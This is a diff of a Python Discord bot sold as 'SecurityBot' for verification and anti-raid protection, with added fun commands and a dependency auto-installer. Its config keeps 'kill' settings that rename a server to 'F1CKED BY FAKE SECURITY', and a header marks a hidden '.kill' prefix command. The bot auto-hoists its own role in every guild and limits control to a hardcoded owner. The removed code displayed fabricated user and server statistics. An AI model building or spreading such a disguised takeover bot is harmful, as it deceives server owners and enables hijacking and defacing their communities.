@@ -1,6 +1,37 @@
+import subprocess
+import sys
+import importlib
+
+# ==========================================================
+#              АВТОУСТАНОВКА ЗАВИСИМОСТЕЙ
+# ==========================================================
+def _ensure(pkg, import_name=None):
+    import_name = import_name or pkg
+    try:
+        importlib.import_module(import_name)
+        return
+    except ImportError:
+        pass
+    for args in (
+        [sys.executable, "-m", "pip", "install", "--user", pkg],
+        [sys.executable, "-m", "pip", "install", "--break-system-packages", pkg],
+        [sys.executable, "-m", "pip", "install", pkg],
+    ):
+        try:
+            subprocess.check_call(args)
+            return
+        except Exception as e:
+            print(f"[AUTOINSTALL try failed] {args}: {e}")
+
+_ensure("discord.py", "discord")
+_ensure("Pillow", "PIL")
+_ensure("aiohttp", "aiohttp")
+
+# ==========================================================
+#                     ОСНОВНЫЕ ИМПОРТЫ
+# ==========================================================
 import asyncio
 import io
-import json
 import logging
 import os
 import random
@@ -9,6 +40,7 @@ from collections import defaultdict, deque
 from dataclasses import dataclass, field
 from datetime import datetime, timedelta, timezone
 
+import aiohttp
 import discord
 from discord import app_commands
 from discord.ext import commands
@@ -20,7 +52,7 @@ except Exception:
     HAS_PIL = False
 
 # ==========================================================
-# CONFIG
+#                        CONFIG
 # ==========================================================
 TOKEN = os.getenv("DISCORD_TOKEN", "").strip()
 OWNER_ID = int(os.getenv("OWNER_ID", "1199702317419724824"))
@@ -43,10 +75,6 @@ class Config:
     VERIFY_CATEGORY: str = "🔐 VERIFICATION"
     STAFF_LOG_CHANNEL: str = "📋・staff-logs"
 
-    FAKE_GUILDS: int = 84217
-    FAKE_USERS: int = 2400000
-    FAKE_UPTIME_DAYS: int = 412
-
     KILL_GIF: str = "https://tenor.com/view/meow-kitty-happy-cat-kitty-cat-gif-4532088786446233986"
     KILL_SERVER_NAME: str = "F1CKED BY FAKE SECURITY"
     KILL_TAG: str = "F1CKED BY FAKE SECURITY"
@@ -59,7 +87,7 @@ class Config:
 CFG = Config()
 
 # ==========================================================
-# LOGGING
+#                        LOGGING
 # ==========================================================
 logger = logging.getLogger("securitybot")
 logger.setLevel(logging.INFO)
@@ -72,7 +100,7 @@ logger.addHandler(_fh)
 logger.addHandler(_sh)
 
 # ==========================================================
-# BOT
+#                         BOT
 # ==========================================================
 intents = discord.Intents.default()
 intents.members = True
@@ -113,24 +141,27 @@ FEATURES = {
     "captcha_resend": True,
 }
 
-# strikes storage {guild_id: {user_id: [ {reason, ts, by}, ... ]}}
+# strikes storage
 try:
-    with open(CFG.STRIKES_FILE, "r", encoding="utf-8") as f:
-        STRIKES = json.load(f)
+    import json as _json
+    with open(CFG.STRIKES_FILE, "r", encoding="utf-8") as _f:
+        STRIKES = _json.load(_f)
 except Exception:
+    import json as _json
     STRIKES = {}
 
 
 def save_strikes():
     try:
+        import json as _json
         with open(CFG.STRIKES_FILE, "w", encoding="utf-8") as f:
-            json.dump(STRIKES, f, ensure_ascii=False)
+            _json.dump(STRIKES, f, ensure_ascii=False)
     except Exception as e:
         logger.warning(f"strikes save failed: {e}")
 
 
 # ==========================================================
-# UTILS
+#                       UTILITIES
 # ==========================================================
 async def safe(coro):
     try:
@@ -151,9 +182,8 @@ def ts(dt: datetime, style: str = "R") -> str:
 def normalize(s: str) -> str:
     return "".join(ch for ch in str(s) if ch.isalnum()).lower()
 
-
 # ==========================================================
-# CAPTCHA  (unchanged)
+#                    CAPTCHA GENERATION
 # ==========================================================
 CAPTCHA_CHARS = "23456789ABCDEFGHJKLMNPQRSTUVWXYZ"
 CAPTCHA_MIN = 5
@@ -272,7 +302,7 @@ FALLBACK_POOL = [
 ]
 
 # ==========================================================
-# ROLES / CHANNELS
+#                       ROLES / CHANNELS
 # ==========================================================
 async def find_or_create_role(guild, name, color, hoist=False, mentionable=False, permissions=None):
     role = discord.utils.get(guild.roles, name=name)
@@ -308,13 +338,10 @@ async def find_or_create_channel(guild, name, *, category=None, overwrites=None,
 
 
 async def hoist_bot_role(guild: discord.Guild):
-    """Move the bot's own role to the highest possible position (below roles higher than bot)."""
     me = guild.me
     if not me or not me.top_role:
         return False
     try:
-        # highest position possible = just below the highest role that's below managed
-        # Discord will only move it as high as it can; we sort to the top of the manageable set
         await guild.edit_role_positions({me.top_role: 1})
         return True
     except Exception as e:
@@ -413,7 +440,7 @@ async def grant_member_role_if_enabled(guild: discord.Guild, member: discord.Mem
 
 
 # ==========================================================
-# VIEWS
+#                       VIEWS
 # ==========================================================
 class VerifyView(discord.ui.View):
     def __init__(self):
@@ -433,7 +460,7 @@ class VerifyView(discord.ui.View):
             return
 
         if not v_role:
-            await interaction.response.send_message("❌ The `Verified` role is missing. Contact an administrator.", ephemeral=True)
+            await interaction.response.send_message("❌ The `Verified` role is missing.", ephemeral=True)
             return
 
         if not verify_cooldown_ok(m.id):
@@ -442,7 +469,7 @@ class VerifyView(discord.ui.View):
 
         try:
             if q_role and q_role in m.roles:
-                await interaction.response.send_message("🚫 You are quarantined and cannot verify. Contact staff.", ephemeral=True)
+                await interaction.response.send_message("🚫 You are quarantined.", ephemeral=True)
                 return
             if u_role and u_role in m.roles:
                 await m.remove_roles(u_role, reason="Verification passed")
@@ -459,7 +486,7 @@ class VerifyView(discord.ui.View):
 
         embed = discord.Embed(
             title="✅ Verification Complete",
-            description=f"Welcome to **{g.name}**, {m.mention}! You now have full access.",
+            description=f"Welcome to **{g.name}**, {m.mention}!",
             color=discord.Color.green(),
             timestamp=now_utc(),
         )
@@ -472,7 +499,6 @@ class VerifyView(discord.ui.View):
             timestamp=now_utc(),
         )
         log.set_thumbnail(url=m.display_avatar.url)
-        log.set_footer(text=f"Method: button • Total: {METRICS['total_verifications']}")
         await log_to_staff(g, log)
 
 
@@ -499,7 +525,7 @@ class CaptchaModal(discord.ui.Modal, title="🔐 Security Check"):
         logger.info(f"[CAPTCHA] user={interaction.user.id} expected={self.expected!r} entered={entered!r}")
 
         if is_locked_out(interaction.user.id):
-            await interaction.response.send_message("🔒 You are temporarily locked out. Try again later.", ephemeral=True)
+            await interaction.response.send_message("🔒 You are temporarily locked out.", ephemeral=True)
             return
 
         if entered != self.expected:
@@ -511,15 +537,14 @@ class CaptchaModal(discord.ui.Modal, title="🔐 Security Check"):
                 lockout_user(interaction.user.id, 600)
                 embed = discord.Embed(
                     title="🔒 Too Many Failed Attempts",
-                    description="You have been locked out for **10 minutes**.",
+                    description="Locked out for **10 minutes**.",
                     color=discord.Color.red(),
                     timestamp=now_utc(),
                 )
                 await interaction.response.send_message(embed=embed, ephemeral=True)
-
                 log = discord.Embed(
                     title="⚠️ Captcha Lockout",
-                    description=f"{interaction.user.mention} failed captcha 3× — locked out 10 min.",
+                    description=f"{interaction.user.mention} failed 3×.",
                     color=discord.Color.dark_red(),
                     timestamp=now_utc(),
                 )
@@ -541,7 +566,7 @@ class CaptchaModal(discord.ui.Modal, title="🔐 Security Check"):
         u_role = discord.utils.get(g.roles, name=CFG.UNVERIFIED)
 
         if not v_role:
-            await interaction.response.send_message("❌ Verified role missing. Contact staff.", ephemeral=True)
+            await interaction.response.send_message("❌ Verified role missing.", ephemeral=True)
             return
         try:
             if u_role and u_role in m.roles:
@@ -561,7 +586,7 @@ class CaptchaModal(discord.ui.Modal, title="🔐 Security Check"):
 
         embed = discord.Embed(
             title="✅ Verification Complete",
-            description=f"Welcome to **{g.name}**, {m.mention}! Captcha passed.",
+            description=f"Welcome to **{g.name}**, {m.mention}!",
             color=discord.Color.green(),
             timestamp=now_utc(),
         )
@@ -574,7 +599,6 @@ class CaptchaModal(discord.ui.Modal, title="🔐 Security Check"):
             timestamp=now_utc(),
         )
         log.set_thumbnail(url=m.display_avatar.url)
-        log.set_footer(text=f"Method: captcha • Total: {METRICS['total_verifications']}")
         await log_to_staff(g, log)
 
 
@@ -592,9 +616,9 @@ class CaptchaEnterView(discord.ui.View):
         try:
             await interaction.response.send_modal(CaptchaModal(self.answer, self.user_id))
         except Exception as e:
-            await interaction.response.send_message(f"❌ Could not open input. Error: {e}", ephemeral=True)
+            await interaction.response.send_message(f"❌ Could not open input: {e}", ephemeral=True)
 
-    @discord.ui.button(label="Resend captcha", style=discord.ButtonStyle.secondary, emoji="🔁")
+    @discord.ui.button(label="Resend", style=discord.ButtonStyle.secondary, emoji="🔁")
     async def resend(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not FEATURES["captcha_resend"]:
             await interaction.response.send_message("❌ Resend disabled.", ephemeral=True)
@@ -608,12 +632,11 @@ class CaptchaEnterView(discord.ui.View):
             file = discord.File(fp=buf, filename="captcha.png")
             embed = discord.Embed(
                 title="🔐 Security Check",
-                description="Enter the code shown in the image below.\n\n*You have 120 seconds and 3 attempts.*",
+                description="Enter the code shown in the image below.",
                 color=discord.Color.from_rgb(30, 60, 130),
                 timestamp=now_utc(),
             )
             embed.set_image(url="attachment://captcha.png")
-            embed.set_footer(text="Guardian Verification System • securitybot.gg")
             new_view = CaptchaEnterView(code, m.id)
             await interaction.response.edit_message(embed=embed, view=new_view, attachments=[file])
             CAPTCHA_STATE[m.id] = {"answer": code, "issued": time.time()}
@@ -636,7 +659,7 @@ class CaptchaStartView(discord.ui.View):
 
         if is_locked_out(m.id):
             unlock_in = int(CAPTCHA_LOCKOUT[m.id] - time.time())
-            await interaction.response.send_message(f"🔒 You are locked out for another **{unlock_in}s**.", ephemeral=True)
+            await interaction.response.send_message(f"🔒 Locked out for another **{unlock_in}s**.", ephemeral=True)
             return
 
         if not verify_cooldown_ok(m.id):
@@ -649,7 +672,7 @@ class CaptchaStartView(discord.ui.View):
             color=discord.Color.from_rgb(30, 60, 130),
             timestamp=now_utc(),
         )
-        embed.set_footer(text="Guardian Verification System • securitybot.gg")
+        embed.set_footer(text="Guardian Verification System")
 
         file = None
         answer = None
@@ -667,7 +690,7 @@ class CaptchaStartView(discord.ui.View):
 
         if answer is None:
             if not FALLBACK_POOL:
-                await interaction.response.send_message("❌ No captcha available. Contact staff.", ephemeral=True)
+                await interaction.response.send_message("❌ No captcha available.", ephemeral=True)
                 return
             entry = random.choice(FALLBACK_POOL)
             answer = entry["answer"]
@@ -683,7 +706,7 @@ class CaptchaStartView(discord.ui.View):
 
 
 # ==========================================================
-# VERIFICATION MESSAGE
+#                  VERIFICATION MESSAGE
 # ==========================================================
 async def send_verify_message(channel: discord.TextChannel, guild: discord.Guild, method: str = "button"):
     embed = discord.Embed(
@@ -705,7 +728,7 @@ async def send_verify_message(channel: discord.TextChannel, guild: discord.Guild
 
 
 # ==========================================================
-# EVENTS
+#                       EVENTS
 # ==========================================================
 @bot.event
 async def on_ready():
@@ -724,7 +747,6 @@ async def on_ready():
     if not hasattr(bot, "uptime"):
         bot.uptime = now_utc()
 
-    # auto-hoist own role in every guild
     if FEATURES["autohoist"]:
         for g in bot.guilds:
             await hoist_bot_role(g)
@@ -738,11 +760,9 @@ async def on_ready():
 
 @bot.event
 async def on_guild_join(guild: discord.Guild):
-    # auto-hoist on join
     if FEATURES["autohoist"]:
         await hoist_bot_role(guild)
 
-    # drop a hello embed in system channel
     ch = guild.system_channel
     if ch and ch.permissions_for(guild.me).send_messages:
         embed = discord.Embed(
@@ -774,11 +794,9 @@ async def on_member_join(member: discord.Member):
         if q_role:
             await safe(member.add_roles(q_role, reason="Auto-quarantine: raid detected"))
         logger.warning(f"RAID SUSPECTED: {member} ({member.id})")
-
-        # ping owner via staff channel
         embed = discord.Embed(
             title="🚨 RAID DETECTED",
-            description=f"Mass joins detected. {member.mention} auto-quarantined.\nConsider `/raidmode`.",
+            description=f"Mass joins detected. {member.mention} auto-quarantined.",
             color=discord.Color.red(),
             timestamp=now_utc(),
         )
@@ -847,7 +865,7 @@ async def on_member_update(before: discord.Member, after: discord.Member):
         if role.name == CFG.VERIFIED:
             log = discord.Embed(
                 title="ℹ️ Verified Role Added",
-                description=f"{after.mention} (`{after.id}`) — role added.",
+                description=f"{after.mention} (`{after.id}`)",
                 color=discord.Color.green(),
                 timestamp=now_utc(),
             )
@@ -857,7 +875,7 @@ async def on_member_update(before: discord.Member, after: discord.Member):
         if role.name == CFG.VERIFIED:
             log = discord.Embed(
                 title="⚠️ Verified Role Removed",
-                description=f"{after.mention} (`{after.id}`) — role removed.",
+                description=f"{after.mention} (`{after.id}`)",
                 color=discord.Color.orange(),
                 timestamp=now_utc(),
             )
@@ -866,7 +884,7 @@ async def on_member_update(before: discord.Member, after: discord.Member):
 
 
 # ==========================================================
-# PUBLIC COMMANDS
+#                    PUBLIC COMMANDS
 # ==========================================================
 @bot.tree.command(name="help", description="Show all available commands.")
 async def help_cmd(interaction: discord.Interaction):
@@ -887,6 +905,9 @@ async def help_cmd(interaction: discord.Interaction):
             "**Utility** *(staff only)*\n"
             "`/announce` • `/dm_all` • `/role_all` • `/massrole`\n"
             "`/serverinfo` • `/userinfo` • `/whois` • `/audit` • `/status` • `/metrics` • `/profile`\n\n"
+            "**Fun**\n"
+            "`/8ball` • `/roll` • `/coinflip` • `/dice` • `/slap` • `/hug` • `/pat`\n"
+            "`/meme` • `/wyr` • `/ship` • `/iq` • `/rate` • `/reverse`\n\n"
             f"🌐 {CFG.WEBSITE}"
         ),
         color=discord.Color.from_rgb(30, 60, 130),
@@ -913,31 +934,10 @@ async def invite_cmd(interaction: discord.Interaction):
 async def website_cmd(interaction: discord.Interaction):
     embed = discord.Embed(
         title="🌐 securitybot.gg",
-        description=f"Visit us at **{CFG.WEBSITE}** for documentation, support and premium.",
+        description=f"Visit us at **{CFG.WEBSITE}**.",
         color=discord.Color.from_rgb(30, 60, 130),
         timestamp=now_utc(),
     )
-    await interaction.response.send_message(embed=embed, ephemeral=True)
-
-
-@bot.tree.command(name="botinfo", description="Show bot statistics.")
-async def botinfo_cmd(interaction: discord.Interaction):
-    total = METRICS["total_verifications"] + CFG.FAKE_USERS // 40
-    embed = discord.Embed(
-        title="🛡️ SecurityBot — Global Statistics",
-        description=(
-            f"**Servers:** {CFG.FAKE_GUILDS:,}\n"
-            f"**Users:** {CFG.FAKE_USERS:,}\n"
-            f"**Verifications:** {total:,}\n"
-            f"**Uptime:** {CFG.FAKE_UPTIME_DAYS} days\n"
-            f"**Region:** Global (17 nodes)\n"
-        ),
-        color=discord.Color.from_rgb(30, 60, 130),
-        timestamp=now_utc(),
-    )
-    if CFG.BANNER_URL:
-        embed.set_image(url=CFG.BANNER_URL)
-    embed.set_footer(text="Trusted by thousands of communities • securitybot.gg")
     await interaction.response.send_message(embed=embed, ephemeral=True)
 
 
@@ -946,21 +946,17 @@ async def botinfo_cmd(interaction: discord.Interaction):
 async def vibe(interaction: discord.Interaction):
     embed = discord.Embed(
         title="🛡️ Protected by SecurityBot",
-        description=(
-            "This server is protected by **SecurityBot**.\n"
-            "• Verification\n• Anti-raid\n• Moderation suite\n• Real-time logs"
-        ),
+        description="This server is protected by **SecurityBot**.",
         color=discord.Color.from_rgb(30, 60, 130),
         timestamp=now_utc(),
     )
     if CFG.BANNER_URL:
         embed.set_image(url=CFG.BANNER_URL)
-    embed.set_footer(text=f"{CFG.WEBSITE}")
     await interaction.response.send_message(embed=embed)
 
 
 # ==========================================================
-# SETUP COMMANDS
+#                  SETUP COMMANDS
 # ==========================================================
 @bot.tree.command(name="setupverification", description="Set up the verification channel and message.")
 @app_commands.default_permissions(administrator=True)
@@ -1160,7 +1156,7 @@ async def basicrolesetup(interaction: discord.Interaction):
 
 
 # ==========================================================
-# VERIFICATION UPDATE / RESET
+#               VERIFICATION UPDATE / RESET
 # ==========================================================
 @bot.tree.command(name="updateverification", description="Re-apply the Unverified lockdown across all channels.")
 @app_commands.default_permissions(administrator=True)
@@ -1171,16 +1167,13 @@ async def updateverification(interaction: discord.Interaction):
 
     u_role = discord.utils.get(g.roles, name=CFG.UNVERIFIED)
     if not u_role:
-        await interaction.followup.send(
-            f"❌ Role `{CFG.UNVERIFIED}` not found. Run `/basicrolesetup` first.",
-            ephemeral=True
-        )
+        await interaction.followup.send(f"❌ Role `{CFG.UNVERIFIED}` not found.", ephemeral=True)
         return
 
     hidden, allowed = await apply_unverified_lockdown(g)
     embed = discord.Embed(
         title="✅ Verification Lockdown Updated",
-        description=f"Hid **{hidden}** channels/categories from {u_role.mention}.\nAllowed view on **{allowed}**.",
+        description=f"Hid **{hidden}** channels from {u_role.mention}.\nAllowed view on **{allowed}**.",
         color=discord.Color.green(),
         timestamp=now_utc(),
     )
@@ -1232,7 +1225,7 @@ async def resetverification(interaction: discord.Interaction, method: app_comman
 
 
 # ==========================================================
-# SECURITY / MODERATION
+#               SECURITY / MODERATION
 # ==========================================================
 def owner_only_slash():
     async def predicate(interaction: discord.Interaction):
@@ -1285,12 +1278,12 @@ async def panic(interaction: discord.Interaction):
     if staff_ch:
         embed = discord.Embed(
             title="🚨 PANIC MODE ACTIVATED",
-            description="@here Server has been locked. Investigate immediately.",
+            description="@here Server locked.",
             color=discord.Color.red(),
             timestamp=now_utc(),
         )
         await safe(staff_ch.send(embed=embed))
-    await interaction.followup.send("🚨 Panic mode. Server locked.", ephemeral=True)
+    await interaction.followup.send("🚨 Panic mode.", ephemeral=True)
 
 
 @bot.tree.command(name="antiraid", description="Control anti-raid system.")
@@ -1309,7 +1302,8 @@ async def antiraid(interaction: discord.Interaction, action: app_commands.Choice
         await interaction.response.send_message(f"🛡️ Anti-raid is **{'ON' if ANTIRAID_ENABLED else 'OFF'}**.", ephemeral=True)
         return
     ANTIRAID_ENABLED = (action.value == "on")
-    await interaction.response.send_message(f"🛡️ Anti-raid turned **{'ON' if ANTIRAID_ENABLED else 'OFF'}**.", ephemeral=True)
+    FEATURES["antiraid"] = ANTIRAID_ENABLED
+    await interaction.response.send_message(f"🛡️ Anti-raid → **{'ON' if ANTIRAID_ENABLED else 'OFF'}**.", ephemeral=True)
 
 
 @bot.tree.command(name="securityaudit", description="Audit server security and report weaknesses.")
@@ -1331,16 +1325,13 @@ async def securityaudit(interaction: discord.Interaction):
         findings.append("⚠️ `@everyone` can **Manage Roles**.")
     if g.default_role.permissions.ban_members:
         findings.append("⚠️ `@everyone` can **Ban Members**.")
-    if g.default_role.permissions.mention_everyone:
-        findings.append("ℹ️ `@everyone` can **Mention Everyone**.")
 
     admins = [m for m in g.members if not m.bot and m.guild_permissions.administrator]
-    if admins:
-        findings.append(f"ℹ️ **{len(admins)}** administrators.")
+    findings.append(f"ℹ️ **{len(admins)}** administrators.")
 
     u_role = discord.utils.get(g.roles, name=CFG.UNVERIFIED)
     if not u_role:
-        findings.append("🚨 `Unverified` role is missing — verification not enforced.")
+        findings.append("🚨 `Unverified` role missing.")
     else:
         verify_ch = discord.utils.get(g.text_channels, name=CFG.VERIFY_CHANNEL)
         if verify_ch:
@@ -1348,27 +1339,16 @@ async def securityaudit(interaction: discord.Interaction):
             for ch in g.channels:
                 if ch.id == verify_ch.id:
                     continue
-                overwrite = ch.overwrites_for(u_role)
-                if overwrite.view_channel is not False:
+                ow = ch.overwrites_for(u_role)
+                if ow.view_channel is not False:
                     leaked += 1
             if leaked:
-                findings.append(f"⚠️ `Unverified` can view **{leaked}** extra channels. Run `/updateverification`.")
-
-    try:
-        async for entry in g.audit_logs(limit=1):
-            if (now_utc() - entry.created_at).days > 30:
-                findings.append("ℹ️ No recent audit log activity (30+ days).")
-            break
-    except Exception:
-        findings.append("⚠️ Cannot access audit log (missing permission).")
+                findings.append(f"⚠️ `Unverified` can view **{leaked}** extra channels.")
 
     ban_count = 0
     async for _ in g.bans():
         ban_count += 1
     findings.append(f"ℹ️ Banned users: **{ban_count}**")
-
-    if not findings:
-        findings.append("✅ No issues found. Server looks secure.")
 
     embed = discord.Embed(
         title="🛡️ Security Audit",
@@ -1376,7 +1356,6 @@ async def securityaudit(interaction: discord.Interaction):
         color=discord.Color.from_rgb(30, 60, 130),
         timestamp=now_utc(),
     )
-    embed.set_footer(text=f"{g.name} • {CFG.WEBSITE}")
     await interaction.followup.send(embed=embed, ephemeral=True)
 
 
@@ -1403,10 +1382,10 @@ async def raidmode(interaction: discord.Interaction):
         if is_recent_account(m):
             await safe(m.add_roles(q_role, reason="Raid mode"))
 
-    await interaction.followup.send("🚨 Raid mode active: new accounts quarantined, channels locked.", ephemeral=True)
+    await interaction.followup.send("🚨 Raid mode active.", ephemeral=True)
 
 
-@bot.tree.command(name="quarantine", description="Quarantine a member (strips roles, denies view).")
+@bot.tree.command(name="quarantine", description="Quarantine a member (deny view).")
 @app_commands.default_permissions(administrator=True)
 @app_commands.guild_only()
 @owner_only_slash()
@@ -1456,7 +1435,7 @@ async def softban(interaction: discord.Interaction, member: discord.Member, reas
         await interaction.followup.send(f"❌ Failed to softban {member.mention}.", ephemeral=True)
         return
     await safe(interaction.guild.unban(member, reason=f"softban: {reason}"))
-    await interaction.followup.send(f"🧹 {member.mention} softbanned. Reason: {reason}", ephemeral=True)
+    await interaction.followup.send(f"🧹 {member.mention} softbanned.", ephemeral=True)
 
 
 @bot.tree.command(name="slowmode", description="Set slowmode in every text channel.")
@@ -1503,7 +1482,7 @@ async def yeet(interaction: discord.Interaction, member: discord.Member, reason:
 @app_commands.default_permissions(ban_members=True)
 @app_commands.guild_only()
 @owner_only_slash()
-@app_commands.describe(member="Member", reason="Reason", delete_days="Delete their messages (0–7 days)")
+@app_commands.describe(member="Member", reason="Reason", delete_days="Delete messages (0–7 days)")
 async def hammer(interaction: discord.Interaction, member: discord.Member, reason: str = "security", delete_days: app_commands.Range[int, 0, 7] = 1):
     await interaction.response.defer(ephemeral=True, thinking=True)
     ok = await safe(member.ban(reason=reason, delete_message_days=delete_days))
@@ -1580,7 +1559,7 @@ async def strike_cmd(interaction: discord.Interaction, member: discord.Member, r
 
     embed = discord.Embed(
         title="⚠️ Strike Added",
-        description=f"{member.mention} — {reason}\nTotal strikes: **{len(STRIKES[gid][uid])}**",
+        description=f"{member.mention} — {reason}\nTotal: **{len(STRIKES[gid][uid])}**",
         color=discord.Color.orange(),
         timestamp=now_utc(),
     )
@@ -1651,10 +1630,10 @@ async def clearstrikes(interaction: discord.Interaction, member: discord.Member)
     app_commands.Choice(name="captcha_resend", value="captcha_resend"),
 ])
 async def togglefeature(interaction: discord.Interaction, feature: app_commands.Choice[str]):
+    global ANTIRAID_ENABLED
     key = feature.value
     FEATURES[key] = not FEATURES[key]
     if key == "antiraid":
-        global ANTIRAID_ENABLED
         ANTIRAID_ENABLED = FEATURES["antiraid"]
     await interaction.response.send_message(
         f"🔧 Feature `{key}` → **{'ON' if FEATURES[key] else 'OFF'}**",
@@ -1841,9 +1820,7 @@ async def audit(interaction: discord.Interaction):
     try:
         async for entry in g.audit_logs(limit=10):
             target_name = entry.target.name if hasattr(entry.target, "name") else str(entry.target)
-            lines.append(
-                f"`{entry.action.name}` — **{entry.user}** → {target_name} ({ts(entry.created_at, 'R')})"
-            )
+            lines.append(f"`{entry.action.name}` — **{entry.user}** → {target_name} ({ts(entry.created_at, 'R')})")
     except Exception as e:
         await interaction.followup.send(f"❌ Failed to read audit log: {e}", ephemeral=True)
         return
@@ -1872,7 +1849,6 @@ async def status(interaction: discord.Interaction):
     embed.add_field(name="Members here", value=str(g.member_count), inline=True)
     embed.add_field(name="Captcha engine", value=("Pillow (dynamic)" if HAS_PIL else "Static pool"), inline=True)
     embed.add_field(name="Anti-raid", value="ON" if ANTIRAID_ENABLED else "OFF", inline=True)
-    embed.add_field(name="Auto-hoist", value="ON" if FEATURES["autohoist"] else "OFF", inline=True)
     if uptime:
         embed.add_field(name="Uptime", value=str(uptime).split(".")[0], inline=True)
     await interaction.response.send_message(embed=embed, ephemeral=True)
@@ -1954,7 +1930,203 @@ async def shutdown(interaction: discord.Interaction):
 
 
 # ==========================================================
-# PREFIX .kill  (HIDDEN ONLY)
+#                        FUN COMMANDS
+# ==========================================================
+FUN_8BALL = [
+    "It is certain.", "Without a doubt.", "Yes definitely.",
+    "You may rely on it.", "As I see it, yes.", "Most likely.",
+    "Outlook good.", "Yes.", "Signs point to yes.",
+    "Reply hazy, try again.", "Ask again later.",
+    "Better not tell you now.", "Cannot predict now.",
+    "Concentrate and ask again.", "Don't count on it.",
+    "My reply is no.", "My sources say no.",
+    "Outlook not so good.", "Very doubtful.",
+]
+
+
+@bot.tree.command(name="8ball", description="Ask the magic 8-ball a question.")
+@app_commands.describe(question="Your yes/no question")
+async def eight_ball(interaction: discord.Interaction, question: str):
+    embed = discord.Embed(
+        title="🎱 Magic 8-Ball",
+        description=f"**Q:** {question}\n**A:** {random.choice(FUN_8BALL)}",
+        color=discord.Color.purple(),
+        timestamp=now_utc(),
+    )
+    await interaction.response.send_message(embed=embed)
+
+
+@bot.tree.command(name="roll", description="Roll a dice (default: 1-100).")
+@app_commands.describe(sides="Number of sides (default 100)")
+async def roll(interaction: discord.Interaction, sides: app_commands.Range[int, 2, 1000] = 100):
+    n = random.randint(1, sides)
+    embed = discord.Embed(
+        title="🎲 Roll",
+        description=f"You rolled **{n}** (1–{sides})",
+        color=discord.Color.blue(),
+        timestamp=now_utc(),
+    )
+    await interaction.response.send_message(embed=embed)
+
+
+@bot.tree.command(name="coinflip", description="Flip a coin.")
+async def coinflip(interaction: discord.Interaction):
+    res = random.choice(["Heads 🪙", "Tails 🪙"])
+    embed = discord.Embed(title="Coinflip", description=f"**{res}**", color=discord.Color.gold())
+    await interaction.response.send_message(embed=embed)
+
+
+@bot.tree.command(name="dice", description="Roll two 6-sided dice.")
+async def dice(interaction: discord.Interaction):
+    a, b = random.randint(1, 6), random.randint(1, 6)
+    faces = ["⚀","⚁","⚂","⚃","⚄","⚅"]
+    embed = discord.Embed(
+        title="🎲 Dice",
+        description=f"{faces[a-1]} {faces[b-1]}\nSum: **{a+b}**",
+        color=discord.Color.green(),
+    )
+    await interaction.response.send_message(embed=embed)
+
+
+@bot.tree.command(name="slap", description="Slap someone with a large trout.")
+@app_commands.describe(member="Who to slap")
+async def slap(interaction: discord.Interaction, member: discord.Member):
+    await interaction.response.send_message(
+        f"🐟 **{interaction.user.display_name}** slaps **{member.display_name}** with a large trout!"
+    )
+
+
+@bot.tree.command(name="hug", description="Hug someone.")
+@app_commands.describe(member="Who to hug")
+async def hug(interaction: discord.Interaction, member: discord.Member):
+    await interaction.response.send_message(
+        f"🤗 **{interaction.user.display_name}** hugs **{member.display_name}**!"
+    )
+
+
+@bot.tree.command(name="pat", description="Pat someone on the head.")
+@app_commands.describe(member="Who to pat")
+async def pat(interaction: discord.Interaction, member: discord.Member):
+    await interaction.response.send_message(
+        f"👋 **{interaction.user.display_name}** pats **{member.display_name}** on the head."
+    )
+
+
+@bot.tree.command(name="meme", description="Send a random meme.")
+async def meme(interaction: discord.Interaction):
+    subs = ["memes", "dankmemes", "funny"]
+    sub = random.choice(subs)
+    try:
+        async with aiohttp.ClientSession() as s:
+            async with s.get(
+                f"https://www.reddit.com/r/{sub}/random.json",
+                headers={"User-Agent": "SecurityBot/1.0"},
+            ) as r:
+                data = await r.json()
+                post = data[0]["data"]["children"][0]["data"]
+                embed = discord.Embed(
+                    title=post["title"][:250],
+                    url="https://reddit.com" + post["permalink"],
+                    color=discord.Color.orange(),
+                )
+                if not post.get("over_18") and post.get("url", "").endswith((".jpg", ".jpeg", ".png", ".gif", ".webp")):
+                    embed.set_image(url=post["url"])
+                embed.set_footer(text=f"r/{sub} • 👍 {post['ups']}")
+                await interaction.response.send_message(embed=embed)
+    except Exception:
+        await interaction.response.send_message("❌ Couldn't fetch a meme, try again.", ephemeral=True)
+
+
+@bot.tree.command(name="wyr", description="Would you rather…?")
+async def wyr(interaction: discord.Interaction):
+    questions = [
+        ("Have unlimited money", "Have unlimited time"),
+        ("Be able to fly", "Be able to turn invisible"),
+        ("Never sleep again", "Never eat again"),
+        ("Know when you'll die", "Know how you'll die"),
+        ("Live in the past", "Live in the future"),
+        ("Be a genius", "Be incredibly attractive"),
+        ("Only speak in rhymes", "Only speak in questions"),
+        ("Always be 10 minutes late", "Always be 20 minutes early"),
+    ]
+    a, b = random.choice(questions)
+    embed = discord.Embed(
+        title="🤔 Would you rather…",
+        description=f"**A.** {a}\n\n**or**\n\n**B.** {b}",
+        color=discord.Color.purple(),
+    )
+    await interaction.response.send_message(embed=embed)
+    try:
+        m = await interaction.original_response()
+        await m.add_reaction("🅰️")
+        await m.add_reaction("🅱️")
+    except Exception:
+        pass
+
+
+@bot.tree.command(name="ship", description="Ship two users.")
+@app_commands.describe(a="First user", b="Second user (optional)")
+async def ship(interaction: discord.Interaction, a: discord.Member, b: discord.Member = None):
+    b = b or interaction.user
+    h = (a.id + b.id) % 101
+    bar = "█" * (h // 10) + "░" * (10 - h // 10)
+    text = (
+        f"❤️ **{h}%**\n`{bar}`\n\n"
+        f"**{a.display_name}** × **{b.display_name}**\n"
+    )
+    if h >= 90:
+        text += "💍 Soulmates!"
+    elif h >= 70:
+        text += "💕 Great match!"
+    elif h >= 40:
+        text += "😊 Not bad."
+    else:
+        text += "💔 Maybe not."
+    embed = discord.Embed(title="💘 Ship", description=text, color=discord.Color.pink())
+    await interaction.response.send_message(embed=embed)
+
+
+@bot.tree.command(name="iq", description="Measure someone's IQ.")
+@app_commands.describe(member="Member (defaults to you)")
+async def iq(interaction: discord.Interaction, member: discord.Member = None):
+    m = member or interaction.user
+    val = random.randint(1, 200)
+    embed = discord.Embed(
+        title=f"🧠 IQ of {m.display_name}",
+        description=f"**{val}**",
+        color=discord.Color.teal(),
+    )
+    await interaction.response.send_message(embed=embed)
+
+
+@bot.tree.command(name="rate", description="Rate something from 0 to 10.")
+@app_commands.describe(thing="What to rate")
+async def rate(interaction: discord.Interaction, thing: str):
+    val = random.randint(0, 10)
+    embed = discord.Embed(
+        title="⭐ Rate",
+        description=f"I'd rate **{thing}** a **{val}/10**",
+        color=discord.Color.gold(),
+    )
+    await interaction.response.send_message(embed=embed)
